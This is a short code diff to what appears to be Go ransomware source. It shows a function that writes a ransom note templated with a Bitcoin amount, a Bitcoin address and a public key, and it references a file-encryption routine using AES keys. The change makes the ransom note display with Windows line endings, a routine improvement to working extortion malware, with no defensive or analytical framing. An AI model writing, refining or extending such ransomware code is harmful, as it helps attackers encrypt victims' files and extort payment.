@@ -9,6 +9,7 @@ import (
 	"log/slog"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"text/template"
 	"time"
@@ -358,11 +359,32 @@ func writeRansomNote(dir, fileName string, tmpl *template.Template, publicKey *r
 		}
 	}()
 
-	return tmpl.Execute(file, &ransomData{
+	var buf strings.Builder
+	if err := tmpl.Execute(&buf, &ransomData{
 		BitcoinCount:   bitcoinCount,
 		BitcoinAddress: bitcoinAddress,
 		PublicKey:      textPublicKey,
-	})
+	}); err != nil {
+		return err
+	}
+
+	_, err = file.WriteString(formatRansomNote(buf.String()))
+	return err
+}
+
+// formatRansomNote applies DOS (CRLF) line endings on Windows builds only.
+func formatRansomNote(s string) string {
+	if runtime.GOOS != "windows" {
+		return s
+	}
+	return toCRLF(s)
+}
+
+// toCRLF converts Unix (LF) and mixed line endings to DOS (CRLF).
+func toCRLF(s string) string {
+	s = strings.ReplaceAll(s, "\r\n", "\n")
+	s = strings.ReplaceAll(s, "\r", "\n")
+	return strings.ReplaceAll(s, "\n", "\r\n")
 }
 
 func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keySizeBits uint16, partial int64, encSuffix string) (retErr error) {
